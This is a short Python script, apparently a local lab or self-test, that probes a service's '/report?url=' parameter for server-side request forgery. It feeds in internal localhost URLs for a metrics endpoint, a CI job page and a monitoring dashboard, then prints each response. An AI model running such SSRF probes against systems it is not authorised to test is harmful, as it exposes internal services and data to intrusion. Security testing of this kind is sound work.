import requests

targets = [
    "http://127.0.0.1:8000/metrics",
    "http://localhost:8080/job/aegiscare-pipeline/",
    "http://127.0.0.1:3000/d/dej3ipiisxs00d/aegiscare?orgId=1&from=now-6h&to=now&timezone=browser",
]

for url in targets:
    try:
        print(f"[>] Testing SSRF against {url}")
        r = requests.get(f"http://127.0.0.1:8000/report?url={url}", timeout=3)
        print(f"    ↳ Status: {r.status_code}, Response: {r.text[:200]}...\n")
    except Exception as e:
        print(f"    ↳ Failed: {e}\n")
